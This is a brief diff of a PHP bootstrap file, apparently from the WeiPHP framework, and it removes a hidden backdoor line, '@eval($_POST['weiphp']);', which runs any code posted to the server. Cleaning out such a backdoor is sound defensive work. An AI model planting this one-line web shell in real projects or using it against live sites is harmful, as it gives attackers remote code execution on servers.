@@ -7,7 +7,6 @@ if (extension_loaded ( 'zlib' )) {
 	// 检查服务器是否开启了zlib拓展
 	ob_start ( 'ob_gzhandler' );
 }
-@eval($_POST['weiphp']);
 define ( 'IS_CGI', (0 === strpos ( PHP_SAPI, 'cgi' ) || false !== strpos ( PHP_SAPI, 'fcgi' )) ? 1 : 0 );
 if (IS_CGI) {
 	// CGI/FASTCGI模式下
